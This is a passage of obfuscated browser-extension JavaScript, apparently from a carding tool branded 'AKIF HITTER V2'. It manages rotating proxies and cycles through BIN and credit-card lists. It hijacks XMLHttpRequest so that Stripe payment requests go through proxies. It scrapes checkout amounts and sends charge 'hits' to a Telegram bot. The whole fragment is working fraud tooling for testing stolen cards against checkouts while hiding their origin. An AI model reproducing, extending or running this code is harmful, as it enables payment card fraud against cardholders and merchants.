16.5L5 21L8 14L2 9H9L12 2Z\" stroke=\"currentColor\" stroke-width=\"1.5\" fill=\"none\"/></svg></button>\n                    <button class=\"proxy-delete-btn\" data-index=\"" + p_2 + "\" title=\"Delete\"><svg width=\"12\" height=\"12\" viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M4 7H20M10 11V16M14 11V16M5 7L6 19C6 20.1046 6.89543 21 8 21H16C17.1046 21 18 20.1046 18 19L19 7M9 7V4C9 3.44772 9.44772 3 10 3H14C14.5523 3 15 3.44772 15 4V7\" stroke=\"currentColor\" stroke-width=\"1.5\" stroke-linecap=\"round\"/></svg></button>\n                </div>\n            </div>\n        ";
          }).join('');
          v_1_3.querySelectorAll(".proxy-test-item-btn").forEach(p_1 => {
            p_1.addEventListener("click", p_1_1 => {
              p_1_1.stopPropagation();
              const v_1_4 = parseInt(p_1.dataset.index);
              fn_23_1(v_1_4);
            });
          }), v_1_3.querySelectorAll(".proxy-activate-btn").forEach(p_1 => {
            p_1.addEventListener("click", p_1_1 => {
              p_1_1.stopPropagation();
              const v_1_4 = parseInt(p_1.dataset.index);
              fn_26_1(v_1_4);
            });
          });
          v_1_3.querySelectorAll(".proxy-delete-btn").forEach(p_1 => {
            p_1.addEventListener("click", p_1_1 => {
              p_1_1.stopPropagation();
              const v_1_4 = parseInt(p_1.dataset.index);
              fn_27_1(v_1_4);
            });
          }), v_1_3.querySelectorAll(".proxy-list-item").forEach(p_1 => {
            p_1.addEventListener("click", p_1_1 => {
              if (p_1_1.target.tagName === "BUTTON") {
                return;
              }
              const v_1_4 = parseInt(p_1.dataset.index);
              fn_26_1(v_1_4);
            });
          });
        }
        async function fn_23_1(p_1) {
          if (v_19_1) {
            fn_35("Test already in progress!", "error");
            return;
          }
          const v_1_3 = v_18_1[p_1];
          if (!v_1_3) return;
          v_19_1 = true;
          v_1_3.status = "checking", fn_22_1(), fn_13_1("Testing #" + (p_1 + 1) + ':\x20' + v_1_3.proxy.substring(0, 40) + "...", "info");
          try {
            const v_1_4 = await new Promise(p_1_1 => {
              const v_1_5 = "proxy_test_" + Date.now() + '_' + Math.random(),
                fn_1_4 = p_1_2 => {
                  p_1_2.data.type === "AKIF_PROXY_TEST_RESPONSE" && p_1_2.data.requestId === v_1_5 && (window.removeEventListener("message", fn_1_4), p_1_1(p_1_2.data.response));
                };
              window.addEventListener("message", fn_1_4);
              const v_2_3 = {
                'type': "AKIF_PROXY_TEST_FROM_PAGE",
                'requestId': v_1_5,
                'proxy': v_1_3.proxy
              };
              window.postMessage(v_2_3, '*'), setTimeout(() => {
                window.removeEventListener("message", fn_1_4);
                p_1_1({
                  'success': false,
                  'error': "Timeout",
                  'message': "Request timeout"
                });
              }, 20000);
            });
            if (v_1_4 && v_1_4.success) v_1_3.status = "working", v_1_3.latency = v_1_4.latency, v_1_3.ip = v_1_4.ip, v_1_3.type = v_1_4.proxy_type, fn_13_1("Working #" + (p_1 + 1) + ':\x20' + v_1_4.ip + '\x20(' + v_1_4.latency + "ms)", "success"), fn_35("Proxy #" + (p_1 + 1) + " working! (" + v_1_4.latency + "ms)", "success");else {
              v_1_3.status = "dead", v_1_3.latency = null, fn_13_1("Dead #" + (p_1 + 1) + ':\x20' + (v_1_4?.["message"] || "Connection failed"), "error"), fn_35("Proxy #" + (p_1 + 1) + " is dead!", "error");
            }
          } catch (v_1_4) {
            v_1_3.status = "dead", fn_13_1("Error #" + (p_1 + 1) + ':\x20' + v_1_4.message, "error"), fn_35("Proxy #" + (p_1 + 1) + " test failed!", "error");
          } finally {
            v_19_1 = false, fn_19_1(), fn_22_1();
          }
        }
        function fn_24_1(p_1) {
          const v_1_3 = "set_active_proxy_" + Date.now() + '_' + Math.random();
          window.postMessage({
            'type': "AKIF_SET_ACTIVE_PROXY_FROM_PAGE",
            'requestId': v_1_3,
            'proxy': p_1
          }, '*');
        }
        function fn_25_1() {
          const v_1_3 = "clear_active_proxy_" + Date.now() + '_' + Math.random();
          window.postMessage({
            'type': "AKIF_CLEAR_ACTIVE_PROXY_FROM_PAGE",
            'requestId': v_1_3
          }, '*');
        }
        function fn_26_1(p_1) {
          if (p_1 < 0 || p_1 >= v_18_1.length) {
            return;
          }
          v_20_1 = p_1, fn_20_1(), fn_22_1();
          const v_1_3 = v_18_1[p_1];
          fn_24_1(v_1_3.proxy), fn_13_1("Activated #" + (p_1 + 1) + ':\x20' + v_1_3.proxy.substring(0, 40) + "...", "success"), fn_35("Activated: " + v_1_3.proxy.substring(0, 40) + "...", "success");
        }
        function fn_27_1(p_1) {
          if (p_1 < 0 || p_1 >= v_18_1.length) return;
          const v_1_3 = v_18_1[p_1].proxy,
            v_2_3 = v_20_1 === p_1;
          v_18_1.splice(p_1, 1);
          if (v_20_1 === p_1) {
            v_20_1 = -1;
          } else v_20_1 > p_1 && v_20_1--;
          fn_19_1(), fn_20_1(), fn_22_1();
          if (v_2_3) {
            if (v_18_1.length > 0) {
              let v_1_4 = v_18_1.findIndex(p_1_1 => p_1_1 && p_1_1.status === "working");
              if (v_1_4 === -1) v_1_4 = 0;
              fn_26_1(v_1_4), setTimeout(() => {
                try {
                  fn_31_1();
                } catch (v_1_5) {}
              }, 1500);
            } else fn_25_1();
          }
          fn_13_1("Deleted #" + (p_1 + 1) + ':\x20' + v_1_3.substring(0, 40) + "...", "warning"), fn_35("Proxy #" + (p_1 + 1) + " deleted", "info");
        }
        let v_21_1 = false;
        async function fn_28_1() {
          const v_1_3 = document.getElementById("bulkProxyInput");
          if (!v_1_3) {
            console.error("bulkProxyInput textarea not found!"), fn_35("Bulk proxy input not found!", "error");
            return;
          }
          const v_2_3 = v_1_3.value.split('\x0a').map(p_1 => p_1.trim()).filter(p_1 => p_1.length > 0);
          if (v_2_3.length === 0) {
            fn_35("Please enter at least one proxy!", "error");
            return;
          }
          if (v_2_3.length > 50) {
            fn_35("Maximum 50 proxies at once!", "error");
            return;
          }
          if (v_21_1) {
            fn_35("Bulk add already in progress!", "warning");
            return;
          }
          v_21_1 = true;
          const v_3_3 = document.getElementById("bulkAddProxyBtn");
          if (!v_3_3) {
            console.error("bulkAddProxyBtn button not found!"), fn_35("Bulk add button not found!", "error"), v_21_1 = false;
            return;
          }
          const v_4_3 = v_3_3.innerHTML;
          v_3_3.innerHTML = "<span class=\"akif-loading\" style=\"width:10px;height:10px;\"></span> TESTING...", v_3_3.disabled = true, fn_13_1("\uD83D\uDE80 Starting bulk add: " + v_2_3.length + " proxies to test...", "info"), fn_35("Testing " + v_2_3.length + " proxies...", "info");
          let v_5_3 = 0,
            v_6_3 = 0,
            v_7_3 = 0;
          for (let v_1_4 = 0; v_1_4 < v_2_3.length; v_1_4++) {
            const v_1_5 = v_2_3[v_1_4],
              v_2_4 = v_18_1.some(p_1 => p_1.proxy === v_1_5);
            if (v_2_4) {
              fn_13_1("\u26A0\uFE0F Already exists: " + v_1_5.substring(0, 40) + "...", "warning"), v_7_3++;
              continue;
            }
            fn_13_1("\uD83D\uDD0D Testing #" + (v_1_4 + 1) + '/' + v_2_3.length + ':\x20' + v_1_5.substring(0, 40) + "...", "info");
            try {
              const v_1_6 = await new Promise(p_1 => {
                const v_1_7 = "proxy_bulk_test_" + Date.now() + '_' + v_1_4 + '_' + Math.random(),
                  fn_1_4 = p_1_1 => {
                    if (p_1_1.data.type === "AKIF_PROXY_TEST_RESPONSE" && p_1_1.data.requestId === v_1_7) {
                      window.removeEventListener("message", fn_1_4), p_1(p_1_1.data.response);
                    }
                  };
                window.addEventListener("message", fn_1_4);
                const v_2_5 = {
                  'type': "AKIF_PROXY_TEST_FROM_PAGE",
                  'requestId': v_1_7,
                  'proxy': v_1_5
                };
                window.postMessage(v_2_5, '*'), setTimeout(() => {
                  window.removeEventListener("message", fn_1_4);
                  p_1({
                    'success': false,
                    'error': "Timeout",
                    'message': "Request timeout"
                  });
                }, 15000);
              });
              v_1_6 && v_1_6.success ? (v_18_1.push({
                'proxy': v_1_5,
                'status': "working",
                'latency': v_1_6.latency,
                'ip': v_1_6.ip,
                'type': v_1_6.proxy_type,
                'addedAt': Date.now()
              }), v_5_3++, fn_13_1("\u2705 ADDED #" + (v_1_4 + 1) + ':\x20' + v_1_5.substring(0, 40) + "... (" + v_1_6.latency + "ms)", "success")) : (v_6_3++, fn_13_1("\u274C DEAD #" + (v_1_4 + 1) + ':\x20' + v_1_5.substring(0, 40) + "...", "error"));
            } catch (v_1_6) {
              v_6_3++, fn_13_1("\u274C ERROR #" + (v_1_4 + 1) + ':\x20' + v_1_5.substring(0, 40) + "...", "error");
            }
            await new Promise(p_1 => setTimeout(p_1, 300)), (v_1_4 + 1) % 5 === 0 && (fn_19_1(), fn_22_1());
          }
          fn_19_1(), fn_22_1();
          v_3_3 && (v_3_3.innerHTML = v_4_3, v_3_3.disabled = false);
          v_1_3.value = '', v_21_1 = false;
          const v_8_3 = "\u2705 Bulk add complete! Added: " + v_5_3 + " | Dead: " + v_6_3 + " | Already exists: " + v_7_3;
          fn_13_1(v_8_3, v_5_3 > 0 ? "success" : "warning"), fn_35(v_8_3, v_5_3 > 0 ? "success" : "warning");
          if (v_20_1 === -1) {
            const v_1_4 = v_18_1.findIndex(p_1 => p_1 && p_1.status === "working");
            if (v_1_4 !== -1) {
              fn_26_1(v_1_4), setTimeout(() => {
                try {
                  fn_31_1();
                } catch (v_1_5) {}
              }, 1500);
            }
          }
        }
        async function fn_29_1(p_1) {
          if (!p_1 || p_1.trim() === '') return fn_35("Please enter a proxy!", "error"), false;
          const v_1_3 = v_18_1.some(p_1_1 => p_1_1.proxy === p_1.trim());
          if (v_1_3) {
            return fn_13_1("Already exists: " + p_1.substring(0, 40) + "...", "warning"), fn_35("Proxy already exists!", "error"), false;
          }
          fn_13_1("Testing before adding: " + p_1.substring(0, 40) + "...", "info"), fn_35("Testing proxy before adding...", "info");
          try {
            const v_1_4 = await new Promise(p_1_1 => {
              const v_1_5 = "proxy_test_before_add_" + Date.now() + '_' + Math.random(),
                fn_1_4 = p_1_2 => {
                  if (p_1_2.data.type === "AKIF_PROXY_TEST_RESPONSE" && p_1_2.data.requestId === v_1_5) {
                    window.removeEventListener("message", fn_1_4), p_1_1(p_1_2.data.response);
                  }
                };
              window.addEventListener("message", fn_1_4), window.postMessage({
                'type': "AKIF_PROXY_TEST_FROM_PAGE",
                'requestId': v_1_5,
                'proxy': p_1.trim()
              }, '*');
              setTimeout(() => {
                window.removeEventListener("message", fn_1_4);
                p_1_1({
                  'success': false,
                  'error': "Timeout",
                  'message': "Request timeout"
                });
              }, 20000);
            });
            if (v_1_4 && v_1_4.success) {
              v_18_1.push({
                'proxy': p_1.trim(),
                'status': "working",
                'latency': v_1_4.latency,
                'ip': v_1_4.ip,
                'type': v_1_4.proxy_type,
                'addedAt': Date.now()
              }), fn_19_1(), fn_22_1(), fn_17_1(), fn_13_1("\u2705 ADDED & WORKING: " + p_1.substring(0, 50) + "... (" + v_1_4.latency + "ms)", "success"), fn_35("\u2705 Proxy added! (" + v_1_4.latency + "ms)", "success");
              const v_1_5 = document.getElementById("proxyInput");
              v_1_5 && (v_1_5.value = '');
              if (v_20_1 === -1 || v_18_1.length === 1) {
                fn_26_1(v_18_1.length - 1), setTimeout(() => {
                  try {
                    fn_31_1();
                  } catch (v_1_6) {}
                }, 1500);
              }
              return true;
            } else return fn_13_1("\u274C NOT ADDED (DEAD): " + p_1.substring(0, 40) + "...", "error"), fn_35("\u274C Proxy is dead! Not added.", "error"), false;
          } catch (v_1_4) {
            return fn_13_1("\u274C NOT ADDED (ERROR): " + p_1.substring(0, 40) + "...", "error"), fn_35("\u274C Proxy test failed! Not added.", "error"), false;
          }
        }
        function fn_30_1() {
          if (v_18_1.length === 0) return;
          if (confirm("Are you sure? Delete all " + v_18_1.length + " proxies?")) {
            const v_1_3 = v_18_1.length;
            v_18_1 = [], v_20_1 = -1, fn_19_1(), fn_20_1(), fn_22_1(), fn_13_1("All " + v_1_3 + " proxies cleared!", "warning"), fn_35("All proxies cleared!", "info");
          }
        }
        const v_22_1 = document.getElementById("addProxyBtn"),
          v_23_1 = document.getElementById("clearAllProxiesBtn"),
          v_24_1 = document.getElementById("proxyInput");
        v_22_1 && v_22_1.addEventListener("click", () => {
          const v_1_3 = v_24_1 ? v_24_1.value.trim() : '';
          fn_29_1(v_1_3);
        });
        v_23_1 && v_23_1.addEventListener("click", () => {
          fn_30_1();
        });
        if (v_24_1) {
          v_24_1.addEventListener("keypress", p_1 => {
            p_1.key === "Enter" && (p_1.preventDefault(), fn_29_1(v_24_1.value.trim()));
          });
        }
        const v_25_1 = document.getElementById("clearProxyLogsBtn");
        v_25_1 && v_25_1.addEventListener("click", () => {
          fn_16_1();
        });
        const v_26_1 = document.getElementById("bulkAddProxyBtn");
        v_26_1 && v_26_1.addEventListener("click", () => {
          fn_28_1();
        });
        const v_27_1 = document.getElementById("refreshIpBtn"),
          v_28_1 = document.getElementById("currentIpValue");
        function fn_31_1() {
          if (!v_28_1) return;
          v_28_1.textContent = "checking...";
          v_28_1.style.color = '';
          const v_1_3 = "akif_ip_" + Date.now() + '_' + Math.random(),
            fn_1_4 = p_1 => {
              if (!p_1.data || p_1.data.type !== "AKIF_GET_CURRENT_IP_RESPONSE" || p_1.data.requestId !== v_1_3) return;
              window.removeEventListener("message", fn_1_4);
              const v_1_4 = p_1.data.response || {};
              v_1_4.success && v_1_4.ip ? (v_28_1.textContent = v_1_4.ip + (v_1_4.viaProxy ? "  (proxy)" : "  (direct)"), v_28_1.style.color = v_1_4.viaProxy ? "#60a5fa" : "#cbd5e1") : (v_28_1.textContent = "failed: " + (v_1_4.error || "unknown"), v_28_1.style.color = "#f87171");
            };
          window.addEventListener("message", fn_1_4), window.postMessage({
            'type': "AKIF_GET_CURRENT_IP_FROM_PAGE",
            'requestId': v_1_3
          }, '*'), setTimeout(() => {
            window.removeEventListener("message", fn_1_4), v_28_1.textContent === "checking..." && (v_28_1.textContent = "timeout", v_28_1.style.color = "#f87171");
          }, 10000);
        }
        v_27_1 && v_27_1.addEventListener("click", fn_31_1);
        const v_29_1 = document.getElementById("modeProxy");
        v_29_1 && v_29_1.addEventListener("click", () => setTimeout(fn_31_1, 100));
        setTimeout(fn_31_1, 500);
        const v_30_1 = document.getElementById("proxyLogsToggle");
        const v_31_1 = document.getElementById("proxyLogsContent");
        async function fn_32_1() {
          try {
            const v_1_3 = {
              'type': "UPDATE_GLOBAL_PROXY_LIST",
              'proxies': v_18_1
            };
            await chrome.runtime.sendMessage(v_1_3);
          } catch (v_1_3) {}
        }
        function fn_33_1(p_1) {
          return fn_29_1(p_1).then(p_1_1 => {
            return p_1_1 && fn_32_1(), p_1_1;
          });
        }
        function fn_34_1() {
          fn_30_1();
          fn_32_1();
        }
        if (v_22_1) {
          const v_1_3 = v_22_1.cloneNode(true);
          v_22_1.parentNode.replaceChild(v_1_3, v_22_1), v_1_3.addEventListener("click", () => {
            const v_1_4 = v_24_1 ? v_24_1.value.trim() : '';
            fn_33_1(v_1_4);
          });
        }
        if (v_23_1) {
          const v_1_3 = v_23_1.cloneNode(true);
          v_23_1.parentNode.replaceChild(v_1_3, v_23_1), v_1_3.addEventListener("click", () => {
            confirm("Are you sure? Delete all " + v_18_1.length + " proxies?") && fn_34_1();
          });
        }
        async function fn_35_1(p_1, p_2 = {}, p_3 = true) {
          return new Promise(p_1_1 => {
            const v_1_3 = "proxy_fetch_" + Date.now() + '_' + Math.random(),
              fn_1_4 = p_1_2 => {
                if (p_1_2.data.type === "PROXY_FETCH_RESPONSE" && p_1_2.data.requestId === v_1_3) {
                  window.removeEventListener("message", fn_1_4), p_1_1(p_1_2.data.response);
                }
              };
            window.addEventListener("message", fn_1_4);
            const v_2_3 = {
              'type': "PROXY_FETCH_REQUEST",
              'requestId': v_1_3,
              'url': p_1,
              'options': p_2,
              'useProxy': p_3
            };
            window.postMessage(v_2_3, '*'), setTimeout(() => {
              window.removeEventListener("message", fn_1_4), p_1_1({
                'success': false,
                'error': "Timeout",
                'usedProxy': null
              });
            }, 30000);
          });
        }
        const v_32_1 = window.XMLHttpRequest;
        window.XMLHttpRequest = function () {
          const v_1_3 = new v_32_1(),
            v_2_3 = v_1_3.open,
            v_3_3 = v_1_3.send;
          const v_4_3 = v_1_3.setRequestHeader;
          let v_5_3 = '',
            v_6_3 = '',
            v_7_3 = null;
          const v_8_3 = {};
          v_1_3.open = function (p_1, p_2) {
            v_5_3 = p_2, v_6_3 = p_1;
            return v_2_3.apply(v_1_3, arguments);
          }, v_1_3.setRequestHeader = function (p_1, p_2) {
            try {
              if (p_1) v_8_3[String(p_1)] = String(p_2);
            } catch (v_1_4) {}
            return v_4_3.apply(v_1_3, arguments);
          };
          return v_1_3.send = function (p_1) {
            v_7_3 = p_1;
            if (v_5_3 && (v_5_3.includes("stripe.com") || v_5_3.includes("api.stripe"))) {
              (async () => {
                try {
                  const v_1_4 = Object.assign({
                      'Content-Type': "application/x-www-form-urlencoded",
                      'Accept': "application/json"
                    }, v_8_3),
                    v_2_4 = {};
                  v_2_4.method = v_6_3, v_2_4.headers = v_1_4, v_2_4.body = v_7_3;
                  const v_3_4 = v_2_4,
                    v_4_4 = await fn_35_1(v_5_3, v_3_4, true);
                  if (v_4_4 && v_4_4.success) {
                    Object.defineProperty(v_1_3, "responseText", {
                      'value': typeof v_4_4.data === "string" ? v_4_4.data : JSON.stringify(v_4_4.data)
                    });
                    const v_1_5 = {};
                    v_1_5.value = v_4_4.data;
                    const v_2_5 = v_1_5;
                    Object.defineProperty(v_1_3, "response", v_2_5);
                    const v_3_5 = {};
                    v_3_5.value = v_4_4.status || 200;
                    const v_4_5 = v_3_5;
                    Object.defineProperty(v_1_3, "status", v_4_5);
                    const v_5_4 = {};
                    v_5_4.value = 0x4, Object.defineProperty(v_1_3, "readyState", v_5_4), v_1_3.onload && v_1_3.onload(), v_1_3.onreadystatechange && v_1_3.onreadystatechange();
                  } else throw new Error(v_4_4?.["error"] || "Proxy request failed");
                } catch (v_1_4) {
                  v_3_3.apply(v_1_3, [v_7_3]);
                }
              })();
              return;
            }
            v_3_3.apply(v_1_3, [v_7_3]);
          }, v_1_3;
        }, window.addEventListener("message", async p_1 => {
          if (p_1.data.type === "PROXY_FETCH_REQUEST") {
            const {
              requestId: v_1_3,
              url: v_2_3,
              options: v_3_3,
              useProxy: v_4_3
            } = p_1.data;
            try {
              const v_1_4 = {
                  'type': "PROXY_FETCH",
                  'url': v_2_3,
                  'method': v_3_3.method || "GET",
                  'headers': v_3_3.headers || {},
                  'body': v_3_3.body || null,
                  'useProxy': v_4_3
                },
                v_2_4 = await chrome.runtime.sendMessage(v_1_4),
                v_3_4 = {
                  'type': "PROXY_FETCH_RESPONSE",
                  'requestId': v_1_3,
                  'response': v_2_4
                };
              window.postMessage(v_3_4, '*');
            } catch (v_1_4) {
              const v_2_4 = {};
              v_2_4.success = false, v_2_4.error = v_1_4.message, v_2_4.usedProxy = null;
              const v_3_4 = v_2_4,
                v_4_4 = {
                  'type': "PROXY_FETCH_RESPONSE",
                  'requestId': v_1_3,
                  'response': v_3_4
                };
              window.postMessage(v_4_4, '*');
            }
          }
        });
        v_30_1 && v_31_1 && (v_31_1.classList.remove("open"), v_31_1.style.display = "none", v_30_1.addEventListener("click", function (p_1) {
          p_1.preventDefault(), p_1.stopPropagation();
          const v_1_3 = this.querySelector(".collapse-icon"),
            v_2_3 = v_31_1.classList.contains("open");
          if (v_2_3) {
            v_31_1.classList.remove("open"), v_31_1.style.display = "none";
            if (v_1_3) {
              v_1_3.classList.remove("icon-rotated");
            }
          } else v_31_1.classList.add("open"), v_31_1.style.display = "block", v_1_3 && v_1_3.classList.add("icon-rotated");
        }));
        fn_18_1(), fn_21_1();
        try {
          if (v_20_1 >= 0 && v_20_1 < v_18_1.length && v_18_1[v_20_1]) fn_24_1(v_18_1[v_20_1].proxy);else {
            if (v_18_1.length > 0) {
              let v_1_3 = v_18_1.findIndex(p_1 => p_1 && p_1.status === "working");
              if (v_1_3 === -1) v_1_3 = 0;
              fn_26_1(v_1_3);
            }
          }
        } catch (v_1_3) {}
        fn_11_1();
        v_13_1 && v_13_1.addEventListener("click", () => {
          if (v_51.length <= 1) {
            fn_35("\u26A0\uFE0F Add more BINs to switch", "error");
            return;
          }
          v_52 = (v_52 + 1) % v_51.length;
          fn_5_2(), fn_6_2(), fn_35("\uD83D\uDD04 Switched to: " + v_51[v_52], "info");
        });
        v_9_2 && v_9_2.addEventListener("click", () => {
          if (v_37 === "bin") {
            if (!fn_9_2()) {
              fn_35("\u26A0\uFE0F Please add BIN first.", "error");
              return;
            }
          } else {
            if (v_38.length === 0) {
              fn_35("\u26A0\uFE0F Please add CCs first.", "error");
              return;
            }
            v_39 = 0;
          }
          if (v_33) {
            fn_67(), v_9_2.innerHTML = "<i class=\"fas fa-play\"></i> START", v_9_2.classList.remove("active");
          } else fn_66(), v_9_2.innerHTML = "<i class=\"fas fa-stop\"></i> STOP", v_9_2.classList.add("active");
        });
        v_10_2 && v_10_2.addEventListener("click", p_1 => {
          p_1.stopPropagation(), fn_77();
        });
        const v_33_1 = document.getElementById("modeBin"),
          v_34_1 = document.getElementById("modeCc"),
          v_35_1 = document.getElementById("modeProxy");
        v_33_1 && v_33_1.addEventListener("click", () => fn_69("bin"));
        v_34_1 && v_34_1.addEventListener("click", () => fn_69('cc'));
        v_35_1 && v_35_1.addEventListener("click", () => fn_69("proxy"));
        document.querySelectorAll(".collapsible-header").forEach(p_1 => {
          p_1.addEventListener("click", function (p_1_1) {
            p_1_1.preventDefault(), p_1_1.stopPropagation();
            const v_1_3 = this.id.replace("Toggle", "Content");
            const v_2_3 = document.getElementById(v_1_3);
            const v_3_3 = this.querySelector(".collapse-icon");
            if (v_2_3 && v_3_3) {
              const v_1_4 = v_2_3.classList.contains("open");
              document.querySelectorAll(".collapsible-content.open").forEach(p_1_2 => {
                if (p_1_2 !== v_2_3) {
                  p_1_2.classList.remove("open");
                  const v_1_5 = p_1_2.previousElementSibling;
                  if (v_1_5) {
                    v_1_5.classList.remove("active");
                    const v_1_6 = v_1_5.querySelector(".collapse-icon");
                    v_1_6 && v_1_6.classList.remove("icon-rotated");
                  }
                }
              }), v_1_4 ? (v_2_3.classList.remove("open"), this.classList.remove("active"), v_3_3.classList.remove("icon-rotated")) : (v_2_3.classList.add("open"), this.classList.add("active"), v_3_3.classList.add("icon-rotated"));
            }
          });
        });
        const v_36_1 = document.getElementById("customNameInput");
        v_36_1 && v_36_1.addEventListener("input", function () {
          fn_32(this.value.trim());
        });
        const v_37_1 = document.getElementById("customEmailInput");
        v_37_1 && v_37_1.addEventListener("input", function () {
          fn_33(this.value.trim());
        });
        const v_38_1 = document.getElementById("tgSettingsBtn");
        v_38_1 && v_38_1.addEventListener("click", function (p_1) {
          p_1.preventDefault();
          p_1.stopPropagation(), fn_75();
          const v_1_3 = document.getElementById("tgModal");
          if (v_1_3) {
            const v_1_4 = document.getElementById("tgModalBotToken"),
              v_2_3 = document.getElementById("tgModalUserId");
            v_1_4 && (v_1_4.value = v_44);
            if (v_2_3) {
              v_2_3.value = v_45;
            }
            const v_3_3 = document.getElementById("tgTestStatus");
            v_3_3 && v_3_3.classList.add("hidden"), v_1_3.classList.remove("hidden"), v_1_3.classList.add("show");
          }
        });
        const v_39_1 = document.getElementById("closeTgModal");
        v_39_1 && v_39_1.addEventListener("click", function () {
          const v_1_3 = document.getElementById("tgModal");
          if (v_1_3) {
            v_1_3.classList.remove("show"), v_1_3.classList.add("hidden");
          }
          fn_76();
        });
        const v_40_1 = document.getElementById("tgTestBtn");
        v_40_1 && v_40_1.addEventListener("click", async function () {
          const v_1_3 = document.getElementById("tgModalBotToken");
          const v_2_3 = document.getElementById("tgModalUserId");
          const v_3_3 = document.getElementById("tgTestStatus"),
            v_4_3 = v_1_3 ? v_1_3.value.trim() : '';
          const v_5_3 = v_2_3 ? v_2_3.value.trim() : '';
          if (!v_4_3 || v_4_3.length < 10) {
            v_3_3 && (v_3_3.textContent = "\u274C Please enter a valid Bot Token", v_3_3.className = "tg-status error", v_3_3.classList.remove("hidden"));
            return;
          }
          if (!v_5_3 || v_5_3.length < 5) {
            if (v_3_3) {
              v_3_3.textContent = "\u274C Please enter a valid User ID", v_3_3.className = "tg-status error", v_3_3.classList.remove("hidden");
            }
            return;
          }
          v_40_1.disabled = true, v_40_1.textContent = "\u23F3 Testing...";
          v_3_3 && (v_3_3.textContent = "\uD83D\uDD04 Connecting to Telegram...", v_3_3.className = "tg-status pending", v_3_3.classList.remove("hidden"));
          try {
            const v_1_4 = "\n<b>\uD83D\uDD25 AKIF HITTER V2 \uD83D\uDD25</b>\n\n<b>\u2705 CONNECTION SUCCESSFUL!</b>\n\nYour Telegram bot has been successfully linked to <b>AKIF HITTER V2</b>.\n\n<b>\uD83D\uDCE8 What you will receive:</b>\n\u2022 \uD83D\uDCB3 Card charges (SUCCESS/DECLINE)\n\u2022 \uD83C\uDF10 Proxy status updates\n\u2022 \uD83D\uDCCA Real-time hit notifications\n\u2022 \u23F1 Response times & details\n\n<b>\uD83E\uDD16 Bot Status:</b> <code>ACTIVE & ONLINE</code>\n\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n<b>\uD83D\uDC8E AKIF HITTER V2</b> | <i>Premium Auto Charge System</i>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n<i>\u26A1 Fast & Reliable | \uD83D\uDD12 Secure Connection</i>\n",
              v_2_4 = {
                'type': "TELEGRAM_SEND",
                'botToken': v_4_3,
                'chatId': v_5_3,
                'text': v_1_4
              },
              v_3_4 = await fn_25(v_2_4);
            if (v_3_4 && v_3_4.ok) {
              if (v_3_3) {
                v_3_3.textContent = "\u2705 Connection successful! Check Telegram.", v_3_3.className = "tg-status success";
              }
              fn_35("\u2705 Telegram connected! Check your messages.", "success");
            } else v_3_3 && (v_3_3.textContent = '❌\x20' + (v_3_4?.["description"] || "Failed to send message"), v_3_3.className = "tg-status error");
          } catch (v_1_4) {
            v_3_3 && (v_3_3.textContent = "\u274C Connection error. Check your inputs.", v_3_3.className = "tg-status error");
          }
          v_40_1.disabled = false, v_40_1.textContent = "\uD83D\uDD17 Test";
        });
        const v_41_1 = document.getElementById("tgSaveBtn");
        v_41_1 && v_41_1.addEventListener("click", function () {
          const v_1_3 = document.getElementById("tgModalBotToken"),
            v_2_3 = document.getElementById("tgModalUserId"),
            v_3_3 = document.getElementById("tgTestStatus"),
            v_4_3 = v_1_3 ? v_1_3.value.trim() : '',
            v_5_3 = v_2_3 ? v_2_3.value.trim() : '';
          v_44 = v_4_3, v_45 = v_5_3, localStorage.setItem("akif_tg_bot_token", v_44), localStorage.setItem("akif_tg_user_id", v_45);
          v_44 && v_45 && (v_43 = true, localStorage.setItem("akif_tg_forward_enabled", "true"));
          const v_6_3 = document.getElementById("tgSettingsBtn");
          v_6_3 && (v_6_3.textContent = v_44 && v_45 ? "View" : "Set"), v_3_3 && (v_3_3.innerHTML = "<i class=\"fas fa-floppy-disk\"></i> Settings saved!", v_3_3.className = "tg-status success", v_3_3.classList.remove("hidden")), fn_35("<i class=\"fas fa-floppy-disk\"></i> TG settings saved!", "success"), setTimeout(() => {
            const v_1_4 = document.getElementById("tgModal");
            if (v_1_4) {
              v_1_4.classList.remove("show"), v_1_4.classList.add("hidden");
            }
            fn_76();
          }, 1000);
        });
        const v_42_1 = document.getElementById("clearHistory");
        v_42_1 && v_42_1.addEventListener("click", () => {
          v_36 = [], localStorage.removeItem(v_7.LOGS);
          const v_1_3 = new Date().toISOString();
          localStorage.setItem(v_7.LOGS_CLEARED_AT, v_1_3);
          fn_30(v_7.LOGS, []), fn_30(v_7.LOGS_CLEARED_AT, v_1_3);
          fn_37();
          fn_35("\u2705 Logs cleared", "success");
        }), v_60 = false;
      }
      function fn_79() {
        if (document.getElementById("usagi-page-watermark")) return;
        const v_1_2 = document.createElement("div");
        v_1_2.id = "usagi-page-watermark", v_1_2.className = "usagi-page-watermark", v_1_2.innerHTML = "<div class=\"akif-wm-line\"></div><span>U</span><span>S</span><span>A</span><span>G</span><span>I</span><div class=\"akif-wm-line\"></div>";
        document.body.appendChild(v_1_2);
      }
      function fn_80() {
        try {
          const v_1_2 = ["[data-testid=\"hosted-payment-total-amount\"]", "[data-testid=\"total-amount\"]", ".OrderSummary-total", ".total-amount", "[class*=\"Total\"]", "[class*=\"total\"]", "[class*=\"Price\"]", "[class*=\"price\"]", ".payment-amount", ".amount"];
          for (const v_1_3 of v_1_2) {
            const v_1_4 = document.querySelector(v_1_3);
            if (v_1_4) {
              const v_1_5 = v_1_4.textContent || v_1_4.innerText,
                v_2_2 = v_1_5.match(/([\d\.,]+)/);
              if (v_2_2) {
                let v_1_6 = v_2_2[1].replace(/[^\d\.]/g, '');
                if (v_1_6 && !isNaN(parseFloat(v_1_6))) {
                  v_56.amount = parseFloat(v_1_6).toFixed(2);
                  break;
                }
              }
            }
          }
        } catch (v_1_2) {}
      }
      fn_80(), function v_1_2() {
        if (window.__akifAutoXOverlayInit) {
          return;
        }
        window.__akifAutoXOverlayInit = true;
        if (window !== window.top) {
          return;
        }
        function fn_1_3() {
          if (document.body) fn_24(async p_1 => {
            p_1 && (v_1_1 = true, await fn_78(), fn_79(), fn_14());
          }, 10);else {
            setTimeout(fn_1_3, 50);
          }
        }
        function fn_2_2() {
          if (document.readyState === "loading") {
            const v_1_3 = {};
